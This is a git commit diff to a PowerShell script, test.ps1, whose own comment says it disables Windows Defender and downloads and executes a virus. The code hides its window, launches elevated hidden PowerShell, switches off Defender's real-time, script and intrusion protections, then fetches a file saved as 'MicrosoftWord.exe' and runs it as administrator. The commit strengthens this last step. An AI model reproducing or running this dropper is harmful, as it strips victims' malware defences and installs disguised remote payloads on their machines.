ca6e9a45900011a9fb8d92b408e60da9d3f208bf
AlphaO4 <jonah.svoboda.2004@gmail.com>
2020-11-12 11:26:18 +0100

    fixed some typos in uploader.ps1  and improved test.ps1

--- Scripts/test.ps1
+++ Scripts/test.ps1
@@ -1,4 +1,4 @@
-#currently this ps1 file will ,on execution, delete Windows defender and download and execute a virus.
+#currently this ps1 file will ,on execution, delete Windows defender and download + execute a virus.
 
 $t = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);'
 add-type -name win -member $t -namespace native
@@ -7,9 +7,9 @@ add-type -name win -member $t -namespace native
 Start-Process -FilePath "powershell" -Verb
 RunAs -WindowStyle hidden -ArgumentList "
 Start-Sleep -s 300
-Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend
+Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend 
 Start-sleep -s 1800
 Start-Process -FilePath "powershell" -Verb
 RunAs -WindowStyle hidden -ArgumentList "$source = "Link"; $destination = "%TEMP%\MicrosoftWord.exe"; Invoke-WebRequest $source -OutFile $destination;
-Start-Process -FilePath %TEMP%\MicrosoftWord.exe" "
+Start-Process -FilePath %TEMP%\MicrosoftWord.exe -Verb RunAs" "
 exit
